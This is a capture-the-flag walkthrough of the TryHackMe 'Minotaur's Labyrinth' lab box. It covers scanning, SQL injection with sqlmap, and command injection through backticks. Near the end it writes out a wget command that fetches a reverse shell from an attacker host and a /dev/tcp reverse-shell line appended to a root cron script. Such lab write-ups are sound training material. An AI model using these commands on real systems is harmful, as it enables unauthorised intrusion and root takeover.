#  [Minotaur's Labyrinth (TryHackMe)](https://tryhackme.com/room/labyrinth8llv)

First an initial scan with rustscan:


<code>rustscan -a 10.10.139.83 --ulimit 5000</code>  


![PICTURE_RUSTSCAN](https://user-images.githubusercontent.com/93183445/140650388-04ab3337-b42c-4bd8-a1ab-cd0daca6c247.png)


After that, let's throw nmap at it:

<code>nmap -sV -sC 10.10.139.83</code>  

![PIC_NMAP](https://user-images.githubusercontent.com/93183445/140650415-24920e15-df4b-4513-9f75-8589d4ab716f.png)

Let's see what the fuzz is all about:

<code>ffuf -u http://10.10.139.83/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code>  

While ffuf is doing its thing, I'll take a look at the ftp which allows anonymous login..
In the ftp directories is some rather interesting stuff, it looks like:

![PIC_FTP1](https://user-images.githubusercontent.com/93183445/140650439-3f17a701-b07c-4d76-aa5b-7c7bcc692865.png)

message.txt:  
<code>Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur</code>

Let's explore further :)

![PIC_FTP2](https://user-images.githubusercontent.com/93183445/140650455-e0da12ec-90bd-451b-978c-88a7b2a8506e.png)

Aaaand we got the fist flag!!!

keep_in_mind.txt (this info will come in handy a bit later):  
<code>Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur</code>

While ffuf is still running, I'm going to take a look at the website:

![PIC_WEB1](https://user-images.githubusercontent.com/93183445/140650473-eaeb3905-efe9-4ea6-928d-c58b19b691a5.png)

No matter what I typed in, there seems to happen no response what so ever. Let's take a look at the source:  
(The hyperlinks are not what they seem, but go for it, if you feel adventurous, lol)

The source code reveals:

![PIC_WEB2](https://user-images.githubusercontent.com/93183445/140650530-b1c3ac5c-9e94-4b87-9bb4-ded0ae887ac5.png)

A look at "view-source:http://10.10.139.83/js/login.js" also reveals nothing of value..

In the meantime ffuf managed to finish:

![PIC_FUFF](https://user-images.githubusercontent.com/93183445/140650575-eccbffef-c76e-44a0-9854-bb71b9747314.png)

Going through the directories, we can find something interesting in the logs directory.
It looks like a captured Burp request which reveals credentials.

---------------------------------------------------------------------------------

POST /minotaur/minotaur-box/login.php HTTP/1.1\
Host: 127.0.0.1\
Content-Length: 36\
sec-ch-ua: "Chromium";v="93", " Not;A Brand";v="99"\
Accept: */*\
Content-Type: application/x-www-form-urlencoded; charset=UTF-8\
X-Requested-With: XMLHttpRequest\
sec-ch-ua-mobile: ?0\
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\
sec-ch-ua-platform: "Windows"\
Origin: http://127.0.0.1\
Sec-Fetch-Site: same-origin\
Sec-Fetch-Mode: cors\
Sec-Fetch-Dest: empty\
Referer: http://127.0.0.1/minotaur/minotaur-box/login.html\
Accept-Encoding: gzip, deflate\
Accept-Language: de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7\
Cookie: PHPSESSID=8co2rbqdli7itj8f566c61nkhv\
Connection: close\

email=hidden&password=hidden


---------------------------------------------------------------------------------

Because I got no response from the login, I turned to the ftp with these very creds, but this trip led to nowhere..
Out of pure desperateness, I turned to the login page again, and got in :) 

![PIC_LANDING1](https://user-images.githubusercontent.com/93183445/140650895-ae7fdda0-ca6d-4505-86ac-e9750e928900.png)

So far we have two names: 'Daedalus' and 'Minotaur'.  
Plus we can appearantly search for 'People' and 'Creatures'.  
Let's do that...

![PIC_LANDING2](https://user-images.githubusercontent.com/93183445/140650903-8dd321a7-1c95-4fd7-b6dd-b90e9cea2d5e.png)

Seems to be some kind of database thingy.. Let's catch the request with Burp and let sqlmap deal with the heavy load.

<code>sqlmap -r req_master.txt --dbs --batch --time-sec=3</code>

Aaaaand we get a hit:

![PIC_SQLMAP1](https://user-images.githubusercontent.com/93183445/140650920-fe7f8b49-d593-4ee4-a906-6c0cce29b8f4.png)

Dump it:

![PIC_SQLMAP2](https://user-images.githubusercontent.com/93183445/140650926-7ff4ef49-4982-45f4-aed7-72e35b7cf2e0.png)

![PIC_SQLMAP3](https://user-images.githubusercontent.com/93183445/140650932-0d1a0c5a-21c6-4d44-993f-846400eff686.png)

As the newly found user with admin rights is in the same table as Daedalus, with whom we were able to login  
before, let's find out if we get in with these creds, after a short trip to Crackstation..  
(https://crackstation.net)

After we log in, we can find the flag in the upper left corner of the site. Besides that, there is a
hyperlink "Secret_Stuff".  
That sounds interesting enough to follow that. Who could resist that..?

![PIC_LANDING3](https://user-images.githubusercontent.com/93183445/140650947-46ec7a1c-6559-4a86-ab0c-370d925017fe.png)

The link leads to the "secret echo panel". There we can input stuff and it gets reflected on the page. Twice.  
No matter what I was trying in regards to command injection, it didn't get me command execution.  
This site led me finally to using backticks, instead of quotation marks.  
[https://book.hacktricks.xyz/pentesting-web/command-injection](https://book.hacktricks.xyz/pentesting-web/command-injection)

\`ls\` shows us:

![PIC_RCE1](https://user-images.githubusercontent.com/93183445/140650956-67398bff-8298-49e7-920f-57642485ca02.png)

So we got rce, let's explore that. And we can find flag3 in the user home directory, which we also are able to read.  

Let's try \`cat /home/user\`

![PIC_RCE2](https://user-images.githubusercontent.com/93183445/140650965-b12da9b1-b7f2-4923-9fc0-c2333e4a7158.png)

Okidoky.. Let's get a shell then. I had to try a few things and ended up with:

\`/usr/bin/wget YOUR-IP/rev.txt -O /tmp/rev.sh\`

Content of rev.txt ([https://www.revshells.com](https://www.revshells.com)):
  
![PIC_REV1](https://user-images.githubusercontent.com/93183445/140651318-d67dd2b4-6a44-4e16-abaf-c89fec962ac7.png)

Set up a local server to serve the shell:  
  
<code>python3 -m http.server 80</code>  
  
Then set up a listener  
  
<code>nc -lnvp 9001</code>
  
and execute the freshly downloaded reverse shell on the target:  
  
\`bash /tmp/rev.sh\`

![PIC_REV2](https://user-images.githubusercontent.com/93183445/140651333-9964013c-007a-45ff-b3f1-e1d662fa0927.png)

After running linpeas.sh and searching around for a bit, I got a tip. Remember the content of one of the files we  
found in the ftp earlier. Where a timer is mentioned? 
There's a file in the root directory that we can write to.  
Plus, it is owned by root.. So let's abuse that and pack a rev-shell in that very file :)

![PIC_REV3](https://user-images.githubusercontent.com/93183445/140651338-c8f5a0cf-5939-4dac-ab46-d50150fe698f.png)
  
<code>echo 'sh -i >& /dev/tcp/YOUR-IP/6666 0>&1' >> timer.sh</code>  

Start another listener and it will connect without any further doing. Now you're root _tataaaa_ \
So let's go and get the final flag in the /root directory:

![PIC_FINAL](https://user-images.githubusercontent.com/93183445/140651348-8391acb8-eb86-438f-9e62-20d61c21fa4f.png)

DONE :)










































